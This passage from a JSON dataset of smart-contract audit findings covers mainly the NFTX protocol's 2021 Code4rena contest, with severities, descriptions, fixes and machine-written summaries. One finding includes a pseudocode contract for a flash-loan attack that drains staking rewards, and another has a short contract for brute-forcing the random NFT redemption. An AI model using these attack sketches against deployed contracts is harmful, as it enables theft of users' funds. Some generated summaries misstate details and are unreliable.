(node_modules/hardhat/console.sol#2)\n\n## Tools Used\n\nSlither\n\n## Recommended Mitigation Steps\n\nFix a definite compiler range that is consistent between contracts and upgrade any affected contracts to conform to the specified compiler.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/3",
      "tags": [],
      "finders": []
    },
    {
      "id": "4022",
      "title": "[L-04] Missing usage of SafeMath",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe following code does not use SafeMath and can potentially lead to overflows:\n- `NFTXFeeDistributor.distribute`\n- `NFTXFeeDistributor._sendForReceiver`\n\n## Impact\n\nWhile looping through all `_feeReceivers` it could be that a broken vault was whitelisted that allows an attacker to perform an external call and break the invariant that always 1000 tokens are left in the contract.\n\n## Recommended Mitigation Steps\n\nAdd SafeMath to `_sendForReceiver` even though one would expect the math to be safe.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/45",
      "tags": [],
      "finders": []
    },
    {
      "id": "4021",
      "title": "[L-03] Missing parameter validation",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nMissing parameter validation for functions:\n- `NFTXEligiblityManager.addModule, updateModule`\n- `NFTXFeeDistributor` all `setter` functions (`setTreasuryAddress`, ...)\n- `NFTXVaultUpgradeable.setManager`\n\n## Impact\n\nSome wallets still default to zero addresses for a missing input which can lead to breaking critical functionality like setting the manager to the zero address and being locked out.\n\n## Recommended Mitigation Steps\n\nValidate the parameters.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/44",
      "tags": [],
      "finders": []
    },
    {
      "id": "4020",
      "title": "[L-02] Missing pool existence check in balanceOf",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIn NFTXLPStaking.sol, deposit(), exit(), withdraw(), claimRewards() and other related functions that take a vaultID as parameter perform a pool existence check on the staking pool associated with that vaultID. However, balanceOf is missing a similar pool check.\n\nThis may result in returning an invalid balance of a non-existing or stale pool.\n\n\n## Proof of Concept\n\nMissing check: https://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L168-L172\n\nChecks: https://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L117\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L144\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd check require(pool.stakingToken != address(0), \"LPStaking: Nonexistent poolâ€); before L170.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/80",
      "tags": [],
      "finders": []
    },
    {
      "id": "4019",
      "title": "[L-01] Front-running setFees() could avoid fees",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nsetVaultFeatures() and setFees() are two separate privileged functions. Users could front-run setFees() immediately after vault is enabled in setVaultFeatures() to mint (and possibly redeem/directRedeem/swap) many tokens. The fees for mint/redeem/directRedeem/swap are not initialized so are 0 by default. This leads to loss of fee revenue.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L45-L48\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L141-L158\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L123-L139\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nSet defaults at initialization or combine this with setVaultFeatures() for atomically enabling functions and setting their fees in the same transaction.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/72",
      "tags": [],
      "finders": []
    },
    {
      "id": "4018",
      "title": "[M-09] The direct redeem fee can be circumvented",
      "impact": "MEDIUM",
      "content": "\nSince the random NFT is determined in the same transaction a payment or swap is being executed, a malicious actor can revert a transaction if they did not get the NFT they wanted. Combined with utilizing Flashbots miners which do not publish transactions which revert with `FlashbotsCheckAndSend`, there would be no cost to constantly attempting this every block or after the nonce is updated from `getPseudoRand()`.\n\n`NFTXVaultUpgradeable.sol`\n```solidity\nLine 374: uint256 tokenId = i < specificIds.length\n    ? specificIds[i]\n    : getRandomTokenIdFromFund();\n```\n\nIn this way, the `directReedemFee` can be avoided and users may lose out on potential earnings. The code below shows a transfer ownership of ERC20 tokens to attack the contract.\n```\nfunction revertIfNotSpecifiedID(uint256 targetTokenID) public {\n    NFTXVaultUpgradeable vault = NFTXVaultUpgradeable(_vault);\n    uint256[] resultID = vault.redeem(1,[]);\n    require(resultID[0] == targetTokenID);\n}\n```\n\nRecommend using a commit-reveal pattern for NFT swaps and redemptions.\n\n**[0xKiwi (NFTX) acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/71)**\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/71#issuecomment-848321831):**\n > Leaving this as medium risk as it puts user earnings into risk\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTXVaultUpgradeable.sol code that allows malicious actors to circumvent the direct redeem fee. This vulnerability has been rated as medium risk. The vulnerability is caused by the random NFT being determined in the same transaction as a payment or swap, which allows malicious actors to revert a transaction if they do not get the NFT they wanted. With the use of Flashbots miners, this can be done without incurring any cost. The impact of this vulnerability is that the directReedemFee can be avoided and users lose on potential earnings. The bug was discovered through Manual Code Review and the recommended mitigation step is to use a commit-reveal pattern for NFT swaps and redemptions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/71",
      "tags": [],
      "finders": []
    },
    {
      "id": "4017",
      "title": "[M-08] A malicious receiver can cause another receiver to lose out on distributed fees by returning false for tokensReceived when receiveRewards is called on their receiver contract.",
      "impact": "MEDIUM",
      "content": "## Handle\n\njanbro\n\n\n## Vulnerability details\n\n## Summary\nA malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when receiveRewards is called on their receiver contract.\n\n## Risk Rating\nMedium\n\n## Vulnerability Details\nA malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when receiveRewards is called on their receiver contract. This causes the fee distributor to double spend the `amountToSend` because the contract incorrectly assumes the returned data is truthful.\n\nNFTXFeeDistributor.sol\n```\nLine 163: (bool success, bytes memory returnData) = address(_receiver.receiver).call(payload);\n```\n\n## Impact\nAny subsequent receivers not receiving funds\n\n## Tools Used\nManual Code Review\n\n## Recommended Mitigation Steps\nDon't trust return data from externally called contracts. Only utilize whether the transaction succeeds to determine if the treasury fallback should be called.\n```\nLine 165: if (!success) {\n```",
      "summary": "\nThis bug report is about a vulnerability in the NFTXFeeDistributor.sol contract that allows malicious receivers to cause other receivers to lose out on distributed fees. The vulnerability occurs when the malicious receiver returns false for the tokensReceived parameter when receiveRewards is called on their receiver contract. This causes the fee distributor to double spend the amountToSend, as it incorrectly assumes the returned data is truthful. The impact of this vulnerability is that subsequent receivers may not receive funds. The risk rating for this vulnerability is medium. The vulnerability was found through manual code review, and the recommended mitigation step is to not trust return data from externally called contracts, and instead only utilize whether the transaction succeeds to determine if the treasury fallback should be called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "4016",
      "title": "[M-07] Tokens can get stuck in NFTXMintRequestEligibility",
      "impact": "MEDIUM",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nWhen dealing with ERC721 (instead of 1155) the amounts array is ignored, which leads to an issue.\n\nUser can call `NFTXMintRequestEligibility.requestMint` for an ERC721 with `amounts[i] = 0`.\nThe `ERC721.transferFrom` is still executed but user cannot `reclaimRequestedMint` later and the NFT is stuck as it checks (`amounts[i] > 0`).\n\n\n## Impact\n\nTokens can get stuck.\nAlso, subscribers to `Request` event could be tricked by specifying `amounts[i] > 1` in the ERC721 case, as only one token was transferred but the amount multiple quantities get logged.\n\n## Recommended Mitigation Steps\n\n`requestMint`: Check `amounts[i] == 1` in ERC721 case, `amounts[i] > 0` in 1155 case.",
      "summary": "\nThis bug report focuses on the ERC721 token, which is a type of Ethereum token. When the user calls the NFTXMintRequestEligibility.requestMint function for an ERC721 token, the amounts array is ignored, leading to an issue. This means that the user can call the function with amounts[i] set to 0, and the ERC721.transferFrom function is still executed, but the user cannot reclaimRequestedMint later and the token is stuck. The impact of this issue is that tokens can become stuck, and subscribers to the Request event could be tricked by specifying amounts[i] as greater than 1, as only one token is transferred but the amount multiple quantities get logged. The recommended mitigation steps are to check amounts[i] is equal to 1 in the ERC721 case and amounts[i] is greater than 0 in the 1155 case in the requestMint function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "4015",
      "title": "[M-06] Manager can grief with fees",
      "impact": "MEDIUM",
      "content": "\nThe fees in `NFTXVaultUpgradeable` can be set arbitrarily high (no restriction in `setFees`).\n\nThe manager can front-run mints and set a huge fee (for example `fee = base`) which transfers user's NFTs to the vault but doesn't mint any pool share tokens in return for the user.\n\nSimilar griefing attacks are also possible with other functions besides `mint`.\n\nRecommend checking for a max fee as a percentage of `base` (like 10%) whenever setting fees.\n\n",
      "summary": "\nThis bug report concerns the NFTXVaultUpgradeable contract, which is vulnerable to a frontrunning attack. The manager of the contract can set an arbitrarily high fee, which will transfer userâ€™s NFTs to the vault without minting them any pool share tokens in return. This can be used to grief users of the contract. The recommended mitigation step is to check for a maximum fee as a percentage of the base whenever setting fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/51",
      "tags": [],
      "finders": []
    },
    {
      "id": "4014",
      "title": "[M-05] Unbounded iteration in NFTXEligiblityManager.distribute over _feeReceivers",
      "impact": "MEDIUM",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXEligiblityManager.distribute` iterates over all `_feeReceivers`.\n\n## Impact\n\nIf the number of `_feeReceivers` gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call `distribute` at all.\n\n## Recommended Mitigation Steps\n\nKeep the number of `_feeReceivers` small.",
      "summary": "\nThis bug report is about the NFTXEligibilityManager.distribute function, which iterates over all _feeReceivers. If the number of _feeReceivers gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call distribute at all. This could have a serious impact on the system. \n\nThe recommended mitigation step to avoid this issue is to keep the number of _feeReceivers small. This would ensure that the transaction's gas cost remains low and the block gas limit is not exceeded. This would ensure that the NFTXEligibilityManager.distribute function is able to be called without any issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/47",
      "tags": [],
      "finders": []
    },
    {
      "id": "4013",
      "title": "[M-03] Fee Distribution Re-Entrancy",
      "impact": "MEDIUM",
      "content": "\nThe `distribute` function of `NFTXFeeDistributor` has no access control and will invoke a fallback on the fee receivers, meaning that a fee receiver can re-enter via this function to acquire their allocation repeatedly potentially draining the full balance and sending zero amounts to the rest of the recipients.\n\nA smart contract with a malicious `receiveRewards` function can re-enter the `distribute` function with the same vault ID, thereby causing the exploit.\n\nRecommend that re-entrancy protection should be incorporated into the `distribute` function. I should note that a seemingly innocuous contract can cause this re-entrancy by simply asking the owners of the project to include an upgrade-able contract that is then replaced for a malicious implementation.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/11)**\n\n",
      "summary": "\nThis bug report is about the `distribute` function of the `NFTXFeeDistributor` smart contract. The function has no access control which allows a fee receiver to re-enter the function and acquire their allocation repeatedly, potentially draining the full balance and sending zero amounts to the rest of the recipients. This exploit was discovered using manual review. The recommended mitigation step is to incorporate re-entrancy protection into the `distribute` function. It should be noted that even a seemingly innocuous contract can cause this re-entrancy if the owners of the project replace it with a malicious implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/11",
      "tags": [],
      "finders": []
    },
    {
      "id": "4012",
      "title": "[M-02] Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something likeÂ OpenZeppelinâ€™s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nWhile most places use a require or safeTransfer/safeTransferFrom, there are three missing cases in the withdrawal of staking token and rescue of arbitrary tokens sent to the FeeDistributor contract.\n\nReference this similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L188\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXFeeDistributor.sol#L45\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/f6d793c136d110774de259d9f3b25d003c4f8098/nftx-protocol-v2/contracts/solidity/NFTXFeeDistributor.sol#L143\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nConsider usingÂ safeTransfer/safeTransferFrom or require() consistently.",
      "summary": "\nThis bug report is about a vulnerability in the NFTX Protocol V2, which can cause silent failures of token transfers and affect token accounting in contract. The vulnerability is caused by the lack of a require() statement that checks the return value of token transfers, or the use of something like OpenZeppelinâ€™s safeTransfer/safeTransferFrom. The bug was identified through manual analysis, and the recommended mitigation step is to use safeTransfer/safeTransferFrom or require() consistently. Proof of concept can be found in the Github repository provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/79",
      "tags": [],
      "finders": []
    },
    {
      "id": "4011",
      "title": "[M-01] Randomization of NFTs returned in redeem/swap operations can be brute-forced",
      "impact": "MEDIUM",
      "content": "\nIf we assume that certain NFTs in a vault over time will have different market demand/price, then the users will try to redeem those specific NFTs. Even if direct redeems are disabled to prevent such a scenario to default to returning randomized NFTs, a user can brute-forced this on-chain randomization (using nonce + blockhash) by repeatedly trying to redeem/swap from a contract, checking the NFT IDs returned from the function and reverting the transaction if those are not the NFT IDs of specific interest.\n\nThe impact will be a subversion of the randomization goal to return random NFTs which cannot be specified by the user.\n\nA [similar exploit happened recently with Meebit NFTs](https://twitter.com/sillytuna/status/1391013965170454540).\n\nRecommend considering only EOA (external only account) for redeem/swap operations to prevent brute-forcing via contracts. Alternatively, make the user commit to pseudo-random IDs before revealing them.\n\n**- [0xKiwi acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/78) **\n\n",
      "summary": "\nThis bug report is about an exploit that can subvert the randomization goal of returning random NFTs from a vault. This exploit is possible due to the fact that a user can brute-force this on-chain randomization (using nonce + blockhash) by repeatedly trying to redeem/swap from a contract, checking the NFT IDs returned from the function and reverting the transaction if those are not the NFT IDs of specific interest. This exploit was demonstrated on Meebit NFTs, and the code for it is provided in the report.\n\nThe recommended mitigation steps are to consider onlyEOA for redeem/swap operations to prevent brute-forcing via contracts. Alternatively, the user must commit to pseudo-random IDs before revealing them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/78",
      "tags": [],
      "finders": []
    },
    {
      "id": "4010",
      "title": "[H-04] NFTXLPStaking Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault",
      "impact": "HIGH",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\nNFTXLPStaking Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault\n\n## Impact\n\nThe LPStaking contract does not require that a stake be locked for any period of time.\n\nThe LPStaking contract also does not track how long your stake has been locked.\n\nSo an attacker Alice can stake, claim rewards, and unstake, all in one transaction.\n\nIf Alice utilizes a flash loan, then she can claim nearly all of the rewards for herself, leaving very little left for the legitimate stakers.\n\nThe fact that the NFTXVaultUpgradeable contract contains a native flashLoan function makes this attack that much easier, although it would still be possible even without that due to flashloans on Uniswap, or wherever else the nftX token is found.\n\nSince a flash loan will easily dwarf all of the legitimate stakers' size of stake, the contract will erroneously award nearly all of the rewards to Alice.\n\n## Proof of Concept\n\n(1) Wait until an NFTX vault has accrued any significant amount of fees/rewards\n(2) FlashLoanBorrow a lot of ETH using any generic flash loan provider\n(3) FlashLoanBorrow a lot of nftx-vault-token using NFTXVaultUpgradeable.flashLoan()\n(4) Deposit the ETH and nftx-vault-token's into Uniswap for Uniswap LP tokens by calling Uniswap.addLiquidity()\n(5) Stake the Uniswap LP tokens in NFTXLPStaking by calling NFTXLPStaking.deposit()\n(6) Claim nearly all of the rewards that have accrued for this vault due to how large the flashLoaned deposit is relative to all of the legitimate stakes by calling NFTXLPStaking.claimRewards()\n(7) Remove LP tokens from NFTXLPStaking by calling NFTXLPStaking.exit();\n(8) Withdraw ETH and nftx-vault-token's by calling Uniswap.removeLiquidity();\n(9) Pay back nftx-vault-token flash loan\n(10) Pay back ETH flash loan\n\nHere is an example contract that roughly implements these steps in pseudocode:\n\ncontract AliceAttackContract {\n\n\n    bytes32 constant private NFTX_FLASH_LOAN_RETURN_VALUE = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n\n    uint256 largeAmountOfEther = 10_000 ether;\n\n\n    uint256 targetVaultId;\n\n\n    address targetVaultAddress;\n\n\n    // attackVaultWithId calls onEthFlashLoan(), which subsequently calls NFTX's onFlashLoan() (flashloans use a callback structure in order to revert if the flash loan is not paid back).\n\n    function attackVaultWithId(uint256 vaultId, address vaultAddress) external {\n\n        targetVaultId = vaultId;\n        targetVaultAddress = vaultAddress;\n\n        EthFlashLoanProvider.borrowFlashLoan(largeAmountOfEther); /* this calls onEthFlashLoan() in between mint and burn */\n\n    }\n\n\n    // onEthFlashLoan is called by the line EthFlashLoanProvider.borrowFlashLoan() in attackVaultWithId() (flashloans use a callback structure in order to revert if the flash loan is not paid back).\n\n    function onEthFlashLoan(...) external {\n\n        NFTXVaultUpgradeable(vaultAddress).flashLoan( /* this calls onFlashLoan() in between mint and burn */\n            address(this),\n            vaultAddress,\n            NFTXVaultUpgradeable(vaultAddress).maxFlashLoan(vaultAddress),\n            ''\n        );\n\n    }\n\n    // onFlashLoan is called by the line NFTXVaultUpgradeable.flashLoan() in onEthFlashLoan() (flashloans use a callback structure in order to revert if the flash loan is not paid back).\n    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes data) external {\n\n        UniswapRouter(uniswapRouterAddress).addLiquidity(token, etherAddress, amount, ...);\n\n        uint256 lpTokenBalance = ERC20(uniswapLPAddress).balanceOf(address(this));\n        ERC20(token).approve(nftxLpStakingAddress, lpTokenBalance);\n        NFTXLPStaking(nftxLpStakingAddress).deposit(targetVaultId, lpTokenBalance);\n\n        NFTXLPStaking(nftxLpStakingAddress).claimRewards(targetVaultId);\n\n        NFTXLPStaking(nftxLpStakingAddress).exit(targetVaultId);\n\n        UniswapRouter(uniswapRouterAddress).removeLiquidity(token, etherAddress, amount, ...);\n\n        return NFTX_FLASH_LOAN_RETURN_VALUE;\n    }\n\n}\n\n\n## Recommended Mitigation Steps\n\nRequire that staked LP tokens be staked for a particular period of time before they can be removed. Although a very short time frame (a few blocks) would avoid flash loan attacks, this attack could still be performed over the course of a few blocks less efficiently. Ideally, you would want the rewards to reflect the product of the amount staked and the duration that they've been staked, as well as having a minimum time staked.\n\nAlternatively, if you really want to allow people to have the ability to remove their stake immediately, then only allow rewards to be claimed for stakes that have been staked for a certain period of time. Users would still be able to remove their LP tokens, but they could no longer siphon off rewards immediately.",
      "summary": "\nA bug report has been submitted for the NFTXLPStaking contract, which is subject to a flash loan attack that can steal nearly all rewards/fees that have accrued for a particular vault. The LPStaking contract does not require that a stake be locked for any period of time and does not track how long a stake has been locked. This means an attacker can stake, claim rewards, and unstake in one transaction, using a flash loan to dwarf all of the legitimate stakers' size of stake and claim nearly all of the rewards for themselves. A proof of concept is provided, as well as mitigation steps to prevent this attack.\n\nThe recommended mitigation steps are to require that staked LP tokens be staked for a particular period of time before they can be removed, or to only allow rewards to be claimed for stakes that have been staked for a certain period of time. This way, users could still remove their LP tokens, but they could no longer siphon off rewards immediately.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/88",
      "tags": [],
      "finders": []
    },
    {
      "id": "4009",
      "title": "[H-03] getRandomTokenIdFromFund yields wrong probabilities for ERC1155",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXVaultUpgradeable.getRandomTokenIdFromFund` does not work with ERC1155 as it does not take the deposited `quantity1155` into account. \n\n## Impact\n\nAssume `tokenId0` has a count of 100, and `tokenId1` has a count of 1.\nThen `getRandomId` would have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.\n\nThis might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.\n\n## Recommended Mitigation Steps\n\nTake the quantities of each token into account (`quantity1155`) which probably requires a design change as it's currently hard to do without iterating over all tokens.",
      "summary": "\nA bug has been reported in the NFTXVaultUpgradeable.getRandomTokenIdFromFund function which does not take the deposited quantity1155 into account. This could lead to an attacker being able to redeem more valuable NFTs as the probabilities are off. The recommended mitigation step is to take the quantities of each token into account, which might require a design change as it is currently hard to do without iterating over all tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/56",
      "tags": [
        "ERC1155"
      ],
      "finders": []
    },
    {
      "id": "4008",
      "title": "[H-02] distribute DoS on missing receiveRewards implementation",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXEligiblityManager._sendForReceiver` should check `returnData.length == 1` before decoding, otherwise if it returns no return data, the `abi.decode` call and with it the whole `distribute` function will revert.\n\n## Impact\n\nA single badly implemented `feeReceiver` can break the whole `distribute` function and do a denial of service by reverting the transaction.\n\n## Recommended Mitigation Steps\n\nChange to: `bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));`.",
      "summary": "\nThis bug report is about an issue with the NFTXEligiblityManager._sendForReceiver function in a project. The issue is that it should check if the return data length is equal to one before decoding it, otherwise, if it returns no return data, the abi.decode call and the whole distribute function will revert. This could lead to a denial of service attack as a single badly implemented feeReceiver could break the whole distribute function by reverting the transaction. The recommended mitigation step is to change the code to bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/46",
      "tags": [],
      "finders": []
    },
    {
      "id": "4007",
      "title": "[H-01] Missing overflow check in flashLoan",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\n`ERC20FlashMintUpgradeable.flashLoan` does not check for an overflow when adding the fees to the flashloan amount.\nThe functionality might have been copied from https://eips.ethereum.org/EIPS/eip-3156 but this one already has overflow checks as it uses solidity 0.8.0.\n\n\n## Impact\n\nThis leads to an issue where the attacker does not need to pay back the flashloan as they will burn 0 tokens:\n\n```solidity\n_burn(address(receiver), amount + fee);\n```\n\nThey end up with a huge profit.\n\n> Luckily, this is currently not exploitable as the fee is set to 0 so there's no possibility to overflow. However, if governance decides to change the flashloan fee, flashloans can be taken without having to repay them.\n\n\n\n## Recommended Mitigation Steps\n\nUse SafeMath.",
      "summary": "\nA bug has been discovered in the `ERC20FlashMintUpgradeable.flashLoan` function of the Ethereum blockchain. This function does not check for an overflow when adding the fees to the flashloan amount, which could lead to an attacker taking a flashloan without having to repay it. This could result in a huge profit for the attacker. The bug is not currently exploitable as the fee is set to 0, however, if the fee is changed, the bug could be exploited. The recommended mitigation step is to use SafeMath to prevent this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "13483",
      "title": "Return value is not used for TokenUtils.withdrawTokens âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed in [DecenterApps/[emailÂ protected]`37dabff`](https://github.com/DecenterApps/defisaver-v3-contracts/commit/37dabff) by storing the return value locally and use its value throughout the execution.\n\n\n#### Description\n\n\nThe return value of `TokenUtils.withdrawTokens` which represents the actual amount of tokens that were transferred is never used throughout the repository. This might cause discrepancy in the case where the original value of `_amount` was `type(uint256).max`.\n\n\n#### Examples\n\n\n**code/contracts/actions/aave/AaveBorrow.sol:L70-L97**\n\n\n\n```\nfunction \\_borrow(\n    address \\_market,\n    address \\_tokenAddr,\n    uint256 \\_amount,\n    uint256 \\_rateMode,\n    address \\_to,\n    address \\_onBehalf\n) internal returns (uint256) {\n    ILendingPoolV2 lendingPool = getLendingPool(\\_market);\n\n    // defaults to onBehalf of proxy\n    if (\\_onBehalf == address(0)) {\n        \\_onBehalf = address(this);\n    }\n\n    lendingPool.borrow(\\_tokenAddr, \\_amount, \\_rateMode, AAVE\\_REFERRAL\\_CODE, \\_onBehalf);\n\n    \\_tokenAddr.withdrawTokens(\\_to, \\_amount);\n\n    logger.Log(\n        address(this),\n        msg.sender,\n        \"AaveBorrow\",\n        abi.encode(\\_market, \\_tokenAddr, \\_amount, \\_rateMode, \\_to, \\_onBehalf)\n    );\n\n    return \\_amount;\n}\n\n```\n**code/contracts/utils/TokenUtils.sol:L46-L53**\n\n\n\n```\nfunction withdrawTokens(\n    address \\_token,\n    address \\_to,\n    uint256 \\_amount\n) internal returns (uint256) {\n    if (\\_amount == type(uint256).max) {\n        \\_amount = getBalance(\\_token, address(this));\n    }\n\n```\n#### Recommendation\n\n\nThe return value can be used to validate the withdrawal or used in the event emitted.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "DeFi Saver",
      "source_link": "https://consensys.net/diligence/audits/2021/03/defi-saver/",
      "github_link": "",
      "tags": [],
